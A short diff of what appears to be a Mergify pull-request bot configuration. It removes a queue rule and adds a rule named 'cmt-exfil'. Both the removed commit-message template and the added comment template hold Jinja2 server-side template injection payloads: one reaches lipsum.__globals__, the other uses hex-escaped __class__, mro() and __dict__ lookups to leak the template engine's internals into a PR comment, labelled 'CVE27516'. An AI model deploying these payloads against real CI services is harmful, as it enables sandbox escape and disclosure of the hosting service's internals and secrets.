@@ -1,15 +1,7 @@
-queue_rules:
-  - name: default
-    queue_conditions:
-      - base=master
-    merge_conditions: []
-    merge_method: squash
-    commit_message_template: |
-      P2-E6: {% set ns = namespace(g=[lipsum]|map(attribute='__globals__')|list) %}{{ ns.g[0]|pprint }}
-
 pull_request_rules:
-  - name: auto-queue
+  - name: cmt-exfil
     conditions:
       - base=master
     actions:
-      queue: {}
+      comment:
+        message: "CVE27516: {{ ''|attr('format')('{0.__class__}') }} | DICT: {{ dict['__class__'] }} | KEYS: {% for k in dict['\x5f\x5fclass\x5f\x5f'].mro()[0]['\x5f\x5fdict\x5f\x5f'] %}{{ k|replace('_','-') }},{% endfor %}"
